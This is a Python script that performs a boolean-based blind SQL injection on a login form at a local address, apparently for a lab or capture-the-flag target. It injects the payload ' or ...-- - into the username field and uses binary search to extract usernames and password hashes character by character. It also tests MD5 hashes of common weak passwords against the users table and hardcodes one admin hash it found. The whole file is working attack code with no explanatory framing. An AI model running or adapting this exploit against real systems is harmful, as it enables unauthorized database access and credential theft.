import requests
import string

# Target information
target_url = "http://127.0.0.1:33038/index.php"

# Boolean-based blind SQLi to enumerate users
# Response Differential: TRUE = password, FALSE = username

def check_condition(payload_condition):
    """Check if a SQL condition returns TRUE or FALSE"""
    payload = f"' or {payload_condition}-- -"
    data = {
        'username': payload,
        'password': 'test',
        'submit': 'Login'
    }
    try:
        response = requests.post(
            target_url,
            data=data,
            headers={'Content-Type': 'application/x-www-form-urlencoded'},
            timeout=10
        )
        response_text = response.text.strip()
        if 'password' in response_text:
            return True
        return False
    except Exception as e:
        return False

def get_length(query):
    """Get the length of a query result using binary search"""
    # First check if there's any result at all
    if not check_condition(f"LENGTH(({query}))>0"):
        return 0
    
    # Binary search for length
    low, high = 1, 100
    while low < high:
        mid = (low + high) // 2
        if check_condition(f"LENGTH(({query}))>{mid}"):
            low = mid + 1
        else:
            high = mid
    return low

def extract_data(query, length):
    """Extract string data character by character"""
    result = ""
    for pos in range(1, length + 1):
        # Binary search for character code
        low, high = 32, 126  # Printable ASCII range
        while low < high:
            mid = (low + high) // 2
            if check_condition(f"ASCII(SUBSTRING(({query}),{pos},1))>{mid}"):
                low = mid + 1
            else:
                high = mid
        result += chr(low)
        print(f"\r  Progress: {result} ({len(result)}/{length})", end='', flush=True)
    print()
    return result

print("[*] Enumerating users via Boolean-based Blind SQLi")
print("[*] This may take a few minutes...")
print()

# Get count of users
count_query = "SELECT COUNT(*) FROM users"
user_count = get_length(count_query)
print(f"[*] Number of users found: {user_count}")

if user_count > 0:
    for i in range(user_count):
        print(f"\n[+] Extracting user {i+1}/{user_count}")
        
        # Get username
        username_query = f"SELECT username FROM users ORDER BY username LIMIT 1 OFFSET {i}"
        username_len = get_length(username_query)
        if username_len > 0:
            username = extract_data(username_query, username_len)
            print(f"  Username: {username}")
            
            # Get password hash
            password_query = f"SELECT password FROM users WHERE username='{username}'"
            password_len = get_length(password_query)
            if password_len > 0:
                password = extract_data(password_query, password_len)
                print(f"  Password hash: {password}")
                print(f"  Credentials: {username}:{password}")
            else:
                print("  No password found")
        else:
            print(f"  User {i}: No username found")

# Also try to login with the extracted credentials
print("\n" + "="*60)
print("[*] Attempting login with extracted credentials...")

# Try all found credentials
found_users = []
print("\nExtracted Users:")
for item in [
    ("admin", "7d39307ae824e70052c0aa16816a9b16")
]:
    print(f"  - {item[0]}:{item[1]}")
    found_users.append(item)

# Let's try some common weak passwords that might work
print("\n[*] Testing common weak passwords...")
weak_passwords = [
    "password", "admin", "123456", "admin123", "password123",
    "qwerty", "letmein", "welcome", "12345678", "abc123",
    "monkey", "1234567", "trustno1", "dragon", "baseball",
    "111111", "iloveyou", "master", "sunshine", "ashley"
]

# Try SQLi to find if any user has simple password using MD5
print("\n[*] Finding users with weak passwords via SQLi...")
for weak_pass in weak_passwords[:10]:  # Test first 10
    import hashlib
    pass_hash = hashlib.md5(weak_pass.encode()).hexdigest()
    print(f"  Testing password '{weak_pass}' (hash: {pass_hash})")
    
    # Check if this hash exists for any user
    query = f"SELECT username FROM users WHERE password='{pass_hash}'"
    if check_condition(f"EXISTS({query})"):
        username_len = get_length(query)
        if username_len > 0:
            username = extract_data(query, username_len)
            print(f"  [!] FOUND: User '{username}' has password '{weak_pass}'")
            found_users.append((username, weak_pass))

print("\n[*] Complete")
